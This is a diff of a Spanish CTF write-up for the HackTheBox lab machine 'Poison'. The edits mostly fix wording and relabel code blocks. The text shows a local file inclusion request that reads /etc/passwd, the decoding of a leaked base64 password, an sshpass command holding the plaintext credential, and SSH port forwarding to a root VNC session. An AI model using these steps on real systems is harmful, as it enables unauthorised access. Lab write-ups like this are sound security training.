@@ -20,12 +20,13 @@ tags:
 # Poison
 
 Es una maquina divertida, tiene varios caminos que te puedes plantear, sin embargo creo que lo mas importante es que
-te puede enseñar muxo, en el sentido del privesec y del enum.
+te puede enseñar mucho, en el sentido del **privesec** y de la **enumeracion**.
 
 > Buena maquina, divertida y completa. Mis respetos al creador :D
 
 ## Enumeracion
 
+Comence por un nmap simple, para hacer un scaner de puertos.
 
 #### NMAP
 ```vim
@@ -69,13 +70,13 @@ revisando los ***.php** podemos ver que uno de ellos de nombre **listfiles.php**
 
 Aquel **pwdbackup.txt** parece mega sospechoso, en el encontramos que nos muestra los archivos de una forma sospechosa tambien.
 
-Lo primero que hice fue cambiar la url mandando la misma peticion del GET pero en la parte de **.php?file=** le mande lo sgte:
+Lo primero que hice fue cambiar la **URL** mandando la misma peticion del GET pero en la parte de **.php?file=** le pedi que me leyera el archivo **/etc/passwd**:
 > **http://10.10.10.84/browse.php?file=/etc/passwd**
 
-como lo crei, me leyo el archivo /etc/passwd y logre cachar que habia un user llamado:
+como lo crei, me leyo el archivo /etc/passwd y logre revisar que habia un user llamado:
 > **charix**
 
-ya con esta informacion me puse a investigar el **pwdbackup.txt** que habia dejado botado, obteniendo de el lo sgte:
+ya con esta informacion me puse a investigar el **pwdbackup.txt** que habia dejado de lado, obteniendo de el lo siguiente:
 
 ```vim
 This password is secure, it's encoded atleast 13 times.. what could go wrong really..
@@ -98,7 +99,7 @@ VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
 Ukd4RVdub3dPVU5uUFQwSwo=
 ```
 
-brigido, a simple vista parece un base64 asi que me dispuse a hacer la conversion las 13 veces que pedia.
+A simple vista parece un base64 asi que me dispuse a hacer la conversion las 13 veces que pedia.
 
 > **wget http://10.10.10.84/pwdbackup.txt**
 >> **tail -n +3 pwdbackup.txt |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d**
@@ -111,10 +112,10 @@ Con eso logramos entrar y obtener el user.txt
 
 ## Root
 
-El root me parecio algo bacan, ya que es mucho mas complejo que el user.
+El root me parecio divertido e interesante, ya que es mucho mas complejo que el user.
 
-al entrar al home del user, podemos encontrar un archivo llamado **secret.zip** al descomprimirlo es un mensaje ecnriptado o un tipo de passwd que no conozco, asi que me dispuse a enumerar un poco la maquina.
-```vim
+Al entrar al home del user, podemos encontrar un archivo llamado **secret.zip** al descomprimirlo es un mensaje ecnriptado o un tipo de passwd que no conozco, asi que me dispuse a enumerar un poco la maquina.
+```Python
 charix@Poison:~ % netstat -anp tcp | grep -i listen
 tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
 tcp4       0      0 *.80                   *.*                    LISTEN
@@ -127,7 +128,7 @@ tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
 
 pense en investigar los puertos 5901 y 5801, pero el camino que recorri fue el del 5901 ya que cache que bajo la maquina corre el siguiente servicio:
 
-```vim
+```Python
 charix@Poison:~ % ps auxww
 USER    PID  %CPU %MEM    VSZ   RSS TT  STAT STARTED     TIME COMMAND
 ...
@@ -141,12 +142,12 @@ entrando en mi maquina, hice un [PortForwarding](https://theuszer0.github.io/The
 
 el servicio corresponde a un [VNC](https://www.realvnc.com/es/connect/) , que a primera vista parece un xterm y se define como un software de acceso remotO.
 
-asi que, vamos al port forwardinggggg...
-```vim
+asi que, haremos el [PortForwarding](https://theuszer0.github.io/TheusZero/CheatSheets/#ssh)...
+```Python
 ssh -L 5901:localhost:5901 -N -f -l charix 10.10.10.84
 ```
 ya montado el proceso, usaremos la herramienta vncviewer.
-```vim
+```Python
 vncviewer localhost:5901
 ```
 de momento nos pide una password y creo que el **secret.zip** debe tenerla.
@@ -154,10 +155,10 @@ de momento nos pide una password y creo que el **secret.zip** debe tenerla.
 #### descargar el .zip
 
 para descargar el .zip ocupe el siguiente comando, todo va incluido
-```vim
+```Python
 sshpass -p 'Charix!2#4%6&8(0' scp -oStrictHostKeyChecking=no charix@10.10.10.84:secret.zip .
 ```
-```vim
+```Python
 root@kali:~# cat secret
 [|Ֆz!
 ```
@@ -168,7 +169,7 @@ root@kali:~# xxd secret
 la clave esta codificada en algun algoritmo que de principio no debemos tocar, asi que me dispuse a ingresar al VCN con la password.
 
 #### Password VCN
-```vim
+```Python
 vncviewer -passwd secret localhost:5901
 ```
-listo, entramos como root y podemos leer todo UWU.
+listo, entramos como root y podemos leer el **root.txt**
